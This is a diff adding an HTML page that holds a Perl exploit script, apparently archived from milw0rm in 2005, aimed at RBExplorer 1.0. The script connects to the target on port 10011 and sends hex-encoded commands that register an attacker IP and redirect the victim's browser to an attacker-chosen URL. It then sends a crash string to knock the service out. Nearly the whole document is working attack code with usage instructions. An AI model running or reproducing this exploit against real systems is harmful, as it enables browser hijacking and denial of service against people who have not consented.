@@ -1,0 +1,72 @@
+<html>
+<head>
+<title>RBExplorer 1.0 (Hijacking Command) Denial of Service Exploit</title>
+<pre>
+#!usr/bin/perl
+#
+#       RBExplorer Hijack Command Exploit
+# ----------------------------------------------
+#      Infam0us Gr0up - Securiti Research
+#
+# Info: infamous.2hell.com
+# Vendor URL: http://www.kabrian.com /arbie@kabrian.com 
+#
+
+use IO::Socket;
+
+if (@ARGV != 3)
+{
+print &quot;\n RBExplorer Hijack Command Exploit\n&quot;;
+print &quot;-----------------------------------------\n\n&quot;;
+print &quot;[!] usage: perl $0 [target] [localIP] [LocalURL]\n&quot;;
+print &quot;[?] exam: perl $0 192.332.34.4 213.234.12.1 http://hijack.spyp0rn.com\n&quot;;
+print &quot;\n&quot;;
+exit ();
+}
+
+$adr = $ARGV[0];
+$lip = $ARGV[1];
+$lurl = $ARGV[2];
+
+$crash =
+&quot;\x23\x44\x6f\x77\x6e\x6c\x6f\x61\x64&quot;.
+&quot;\x57\x48\x4f\x41\x52\x45\x59\x4f\x55\x49&quot;.
+&quot;\x53\x4e\x4f\x54\x49\x4d\x50\x4f\x52\x54&quot;.
+&quot;\x41\x4e\x54\x42\x55\x54\x54\x48\x45\x52&quot;.
+&quot;\x45\x4f\x4e\x45\x57\x41\x59\x54\x4f\x46&quot;.
+&quot;\x49\x4c\x4c\x46\x52\x45\x45\x49\x42\x45&quot;.
+&quot;\x4c\x49\x56\x45&quot;;
+
+print &quot;\n[+] Connect to $adr..\n&quot;;
+$remote = IO::Socket::INET-&gt;new(Proto=&gt;&quot;\x74\x63\x70&quot;, PeerAddr=&gt;$adr,
+PeerPort=&gt;10011, Reuse=&gt;1) or die &quot;Error: can't connect to $adr:10011\n&quot;;
+
+$chr1 = &quot;\x24\x49\x50\x3a&quot;;
+$chr2 = &quot;\x23\x4e\x61\x76\x69\x67\x61\x74\x65\x54\x6f&quot;;
+
+print &quot;[+] Connected\n&quot;;
+$remote-&gt;autoflush(1);
+print $remote &quot;\n&quot;;
+sleep(1);
+print $remote &quot;$chr1 $lip\n&quot; and print &quot;[+] Hijacking $adr...\n&quot; or die
+&quot;[-] Error: $lip not listen\n&quot;;
+sleep(2);
+print &quot;[+] $lip listening!\n&quot;;
+print $remote &quot;$chr2 $lurl\n&quot; and print &quot;[+] Hijacking browser...\n&quot; or die
+&quot;[-] Error: hijacking failed\n&quot;;
+sleep(2);
+print &quot;[+] Browser hijacked!\n&quot;;
+print &quot;[+] Sleep 15 seconds..\n&quot;;
+sleep(15);
+print &quot;[+] Send crash byte..\n&quot;;
+print $remote &quot;$crash&quot;;
+sleep(2);
+print &quot;[+] DONE\n\n&quot;;
+print &quot;..press any key to exit\n&quot;;
+$bla= ;
+close $remote;
+
+# milw0rm.com [2005-10-11]
+</pre>
+</html>
+
